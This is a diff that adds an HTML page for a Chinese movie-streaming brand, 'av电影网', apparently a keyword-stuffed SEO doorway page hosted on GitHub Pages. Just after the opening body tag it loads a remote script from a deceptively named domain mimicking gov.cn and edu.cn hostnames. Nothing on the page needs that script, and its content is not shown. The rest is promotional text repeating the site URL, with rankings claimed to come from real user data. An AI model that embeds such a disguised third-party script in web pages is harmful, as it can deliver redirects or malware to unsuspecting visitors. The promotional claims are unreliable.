@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>av电影网 - 高清影视在线观看 | 官网 https://avdianyingwang-app.github.io</title>
+    <meta name="description" content="av电影网（https://avdianyingwang-app.github.io）是专业的电影在线观看平台，提供最新高清电影、热播剧集、动漫综艺。来av电影网，享受极致观影体验！">
+    <meta name="keywords" content="av电影网, avdianyingwang-app.github.io, 高清电影, 在线观看, 电影推荐">
+    <style>
+        :root {
+            --bg-color: #0f0c29;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --neon-pink: #ff00ff;
+            --neon-blue: #00ffff;
+            --text-main: #ffffff;
+            --text-muted: #b3b3b3;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: var(--text-main);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        a {
+            text-decoration: none;
+            color: var(--neon-blue);
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: var(--neon-pink);
+            text-shadow: 0 0 10px var(--neon-pink);
+        }
+
+        /* 导航栏 */
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            padding: 1rem 5%;
+            background: rgba(15, 12, 41, 0.9);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 0, 255, 0.2);
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--text-main);
+            text-shadow: 0 0 10px var(--neon-pink), 0 0 20px var(--neon-pink);
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: var(--text-main);
+            font-weight: 500;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            border: 1px solid transparent;
+        }
+
+        nav a:hover {
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+
+        /* 主体内容 */
+        main {
+            padding-top: 100px;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding-bottom: 2rem;
+        }
+
+        section {
+            padding: 4rem 5%;
+            margin-bottom: 2rem;
+        }
+
+        h1, h2, h3 {
+            margin-bottom: 1.5rem;
+            color: var(--text-main);
+        }
+
+        h1 {
+            font-size: 3rem;
+            text-align: center;
+            text-shadow: 0 0 15px var(--neon-pink);
+            margin-bottom: 2rem;
+        }
+
+        h2 {
+            font-size: 2rem;
+            border-left: 5px solid var(--neon-blue);
+            padding-left: 1rem;
+            text-shadow: 0 0 10px var(--neon-blue);
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text-muted);
+        }
+
+        /* 英雄区域 */
+        .hero {
+            text-align: center;
+            padding: 6rem 5%;
+            background: radial-gradient(circle at center, rgba(255, 0, 255, 0.1), transparent);
+            border-radius: 20px;
+            margin: 2rem 5%;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto 2rem;
+        }
+
+        .url-highlight {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon-blue);
+            border-radius: 10px;
+            color: var(--neon-blue);
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-top: 1rem;
+        }
+
+        /* 网格布局 - 电影卡片 */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            backdrop-filter: blur(5px);
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.2);
+            border-color: rgba(255, 0, 255, 0.5);
+        }
+
+        .card h3 {
+            color: var(--neon-pink);
+            margin-bottom: 0.5rem;
+        }
+
+        /* 分类标签 */
+        .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .tag {
+            padding: 0.5rem 1.5rem;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon-blue);
+            border-radius: 30px;
+            color: var(--neon-blue);
+            cursor: pointer;
+        }
+
+        .tag:hover {
+            background: var(--neon-blue);
+            color: #000;
+        }
+
+        /* 排行榜 */
+        .ranking-list {
+            list-style: none;
+            counter-reset: ranking;
+        }
+
+        .ranking-list li {
+            padding: 1rem;
+            margin-bottom: 1rem;
+            background: var(--card-bg);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            counter-increment: ranking;
+            border-left: 3px solid var(--neon-pink);
+        }
+
+        .ranking-list li::before {
+            content: counter(ranking);
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--neon-pink);
+            margin-right: 1rem;
+            text-shadow: 0 0 10px var(--neon-pink);
+        }
+
+        /* 关于我们 */
+        .about-content {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 15px;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+        }
+
+        .about-content strong {
+            color: var(--neon-blue);
+        }
+
+        /* 页脚 */
+        footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 4rem;
+            color: var(--text-muted);
+        }
+
+        /* 移动端自适应 */
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                padding: 1rem;
+            }
+
+            nav ul {
+                margin-top: 1rem;
+                gap: 1rem;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            h2 {
+                font-size: 1.5rem;
+            }
+
+            .hero {
+                padding: 4rem 1rem;
+            }
+
+            section {
+                padding: 2rem 1rem;
+            }
+
+            .grid-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+    <header>
+        <div class="logo">av电影网</div>
+        <nav>
+            <ul>
+                <li><a href="#">首页推荐</a></li>
+                <li><a href="#">电影分类</a></li>
+                <li><a href="#">热门排行</a></li>
+                <li><a href="#">关于我们</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- 首页/英雄区域 -->
+        <section class="hero" id="home">
+            <h1>av电影网</h1>
+            <p>欢迎访问av电影网，您的专属高清影视乐园。我们致力于为影迷提供最新、最热的电影资源和极致的观影体验。</p>
+            <div class="url-highlight">官网地址：https://avdianyingwang-app.github.io</div>
+        </section>
+
+        <!-- 栏目一：首页推荐 -->
+        <section id="recommend">
+            <h2>首页推荐</h2>
+            <p>av电影网为您精选了以下高分大片，足不出户即可享受影院级视听盛宴。</p>
+            <div class="grid-container">
+                <div class="card">
+                    <h3>沙丘2</h3>
+                    <p>科幻史诗巨制，视听效果震撼，av电影网评分9.5。</p>
+                </div>
+                <div class="card">
+                    <h3>奥本海默</h3>
+                    <p>诺兰巅峰之作，IMAX摄影的极致呈现。</p>
+                </div>
+                <div class="card">
+                    <h3>坠落的审判</h3>
+                    <p>金棕榈奖最佳影片，剧情张力十足。</p>
+                </div>
+                <div class="card">
+                    <h3>哥斯拉2</h3>
+                    <p>怪兽宇宙新篇章，特效炸裂。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目二：电影分类 -->
+        <section id="categories">
+            <h2>电影分类</h2>
+            <p>在av电影网（https://avdianyingwang-app.github.io），您可以轻松找到喜欢的类型：</p>
+            <div class="tags">
+                <span class="tag">动作片</span>
+                <span class="tag">科幻片</span>
+                <span class="tag">喜剧片</span>
+                <span class="tag">爱情片</span>
+                <span class="tag">恐怖片</span>
+                <span class="tag">动画片</span>
+                <span class="tag">纪录片</span>
+                <span class="tag">国产剧</span>
+                <span class="tag">欧美剧</span>
+                <span class="tag">韩剧</span>
+            </div>
+        </section>
+
+        <!-- 栏目三：热门排行 -->
+        <section id="ranking">
+            <h2>热门排行榜</h2>
+            <p>基于av电影网用户真实播放数据生成的本周榜单：</p>
+            <ul class="ranking-list">
+                <li>热辣滚烫 - 票房与口碑双丰收</li>
+                <li>飞驰人生2 - 韩寒的赛车梦想</li>
+                <li>第二十条 - 现实主义力作</li>
+                <li>年会不能停！ - 打工人必看喜剧</li>
+                <li>周处除三害 - 台湾犯罪动作片黑马</li>
+            </ul>
+        </section>
+
+        <!-- 栏目四：关于我们 -->
+        <section id="about">
+            <h2>关于av电影网</h2>
+            <div class="about-content">
+                <p>av电影网（网址：<strong>https://avdianyingwang-app.github.io</strong>）是一个专注于影视资源分享与推荐的平台。</p>
+                <p>我们的宗旨是让每一位访客都能在av电影网找到心仪的影片。无论是最新上映的大片，还是经典怀旧的老片，这里应有尽有。</p>
+                <p>请认准我们的官方网址：<strong>https://avdianyingwang-app.github.io</strong>，收藏本站，精彩电影不间断！</p>
+                <p>联系邮箱：contact@avdianyingwang-app.github.io（示例）</p>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 av电影网 | 官方网址：https://avdianyingwang-app.github.io</p>
+        <p>关键词：av电影网、高清电影、在线观看</p>
+    </footer>
+
+</body>
+</html>
